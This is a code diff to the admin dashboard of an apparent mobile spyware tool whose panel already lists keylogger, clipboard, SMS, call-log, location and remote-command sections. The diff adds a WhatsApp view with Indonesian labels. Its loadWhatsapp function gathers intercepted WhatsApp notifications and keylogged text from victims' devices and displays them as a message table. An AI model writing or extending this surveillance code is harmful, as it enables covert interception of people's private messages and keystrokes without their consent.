@@ -161,6 +161,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
       <div class="nav-item" data-section="notifications"><svg><use href="/static/icons.svg#icon-bell"/></svg> Notifications <span class="badge" id="notifBadge">{{ total_notif }}</span></div>
       <div class="nav-item" data-section="chats"><svg><use href="/static/icons.svg#icon-chat"/></svg> Chats</div>
       <div class="nav-item" data-section="facebook"><svg><use href="/static/icons.svg#icon-globe"/></svg> Facebook</div>
+      <div class="nav-item" data-section="whatsapp"><svg><use href="/static/icons.svg#icon-chat"/></svg> WhatsApp</div>
       <div class="nav-item" data-section="contacts"><svg><use href="/static/icons.svg#icon-contacts"/></svg> Contacts</div>
       <div class="nav-item" data-section="apps"><svg><use href="/static/icons.svg#icon-apps"/></svg> App Usage</div>
       <div class="nav-item" data-section="devices"><svg><use href="/static/icons.svg#icon-devices"/></svg> Devices <span class="badge" id="devBadge">{{ total_devices }}</span></div>
@@ -272,6 +273,20 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
         <div class="card"><div class="card-header"><svg><use href="/static/icons.svg#icon-globe"/></svg> Facebook Activity</div><div class="card-body" id="fbData"></div></div>
       </div>
 
+      <!-- ======== WHATSAPP ======== -->
+      <div class="section" id="sec-whatsapp">
+        <div class="stats-row" id="waStats"></div>
+        <div class="filter-bar">
+          <select id="waFilter" style="background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:6px 10px;color:var(--text);font-size:12px" onchange="loadWhatsapp()">
+            <option value="all">Semua</option>
+            <option value="whatsapp">WhatsApp</option>
+            <option value="business">WhatsApp Business</option>
+          </select>
+          <div class="filter-chip active" onclick="loadWhatsapp()">Refresh</div>
+        </div>
+        <div class="card"><div class="card-header">Pesan WhatsApp</div><div class="card-body" id="waData"></div></div>
+      </div>
+
       <!-- ======== CONTACTS ======== -->
       <div class="section" id="sec-contacts">
         <div class="filter-bar">
@@ -335,7 +350,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 
 <script>
 const BASE_URL = '{{ base_url }}';
-const SECTION_NAMES = {overview:'Overview',location:'Location',keylog:'Keylogger',clipboard:'Clipboard',calls:'Call Logs',sms:'SMS',notifications:'Notifications',chats:'Chats',facebook:'Facebook',contacts:'Contacts',apps:'App Usage',devices:'Devices',commands:'Commands',settings:'Settings'};
+const SECTION_NAMES = {overview:'Overview',location:'Location',keylog:'Keylogger',clipboard:'Clipboard',calls:'Call Logs',sms:'SMS',notifications:'Notifications',chats:'Chats',facebook:'Facebook',whatsapp:'WhatsApp',contacts:'Contacts',apps:'App Usage',devices:'Devices',commands:'Commands',settings:'Settings'};
 
 function switchSection(name){
   document.querySelectorAll('.nav-item').forEach(e=>e.classList.remove('active'));
@@ -355,6 +370,7 @@ function switchSection(name){
   else if(name=='notifications') loadNotifs();
   else if(name=='chats') loadChats();
   else if(name=='facebook') loadFacebook();
+  else if(name=='whatsapp') loadWhatsapp();
   else if(name=='contacts') loadContacts();
   else if(name=='apps') loadApps();
   else if(name=='devices') loadDevices();
@@ -596,6 +612,50 @@ async function loadFacebook(){
   html+=`</div></div>`;
   
   document.getElementById('fbData').innerHTML=html;
+}
+
+// WhatsApp
+async function loadWhatsapp(){
+  let d=await api('/admin/dashboard/json');
+  if(!d) return;
+  let filter=document.getElementById('waFilter').value;
+  
+  let waPkgs = ['com.whatsapp', 'whatsapp'];
+  let items=[];
+  let waNotifs=0, waKeylogs=0;
+  
+  (d.notifs||[]).forEach(n=>{
+    let app=(n.app||'').toLowerCase();
+    if(waPkgs.some(p=>app.includes(p))){
+      if(filter=='all'||(filter=='business'&&app.includes('w4b'))||(filter=='whatsapp'&&!app.includes('w4b'))){
+        items.push({type:'notifikasi',app:n.app||'',msg:n.message||'',ts:n.timestamp||''});
+        waNotifs++;
+      }
+    }
+  });
+  
+  (d.keylogs||[]).forEach(k=>{
+    let pkg=(k.package||'').toLowerCase();
+    if(waPkgs.some(p=>pkg.includes(p))){
+      items.push({type:'ketikan',app:k.package||'',msg:k.text||'',ts:k.received_at||''});
+      waKeylogs++;
+    }
+  });
+  
+  document.getElementById('waStats').innerHTML=
+    `<div class="stat-card"><div class="icon"><svg><use href="/static/icons.svg#icon-bell"/></svg></div><div class="num">${waNotifs}</div><div class="label">Notifikasi</div></div>
+    <div class="stat-card"><div class="icon"><svg><use href="/static/icons.svg#icon-keylog"/></svg></div><div class="num">${waKeylogs}</div><div class="label">Aktivitas</div></div>
+    <div class="stat-card"><div class="icon"><svg><use href="/static/icons.svg#icon-chat"/></svg></div><div class="num">${items.length}</div><div class="label">Total Pesan</div></div>`;
+  
+  items.sort((a,b)=>a.ts.localeCompare(b.ts));
+  if(!items.length) return void(document.getElementById('waData').innerHTML='<div class="empty-state">Belum ada pesan WhatsApp</div>');
+  
+  let html='<table><tr><th>Waktu</th><th>Tipe</th><th>Pesan</th></tr>';
+  items.slice(-50).reverse().forEach(i=>{
+    html+=`<tr><td>${(i.ts||'').slice(11,19)}</td><td style="color:var(--green)">${i.type}</td><td style="max-width:350px">${esc(i.msg.slice(0,150))}</td></tr>`;
+  });
+  html+='</table>';
+  document.getElementById('waData').innerHTML=html;
 }
 
 // Contacts
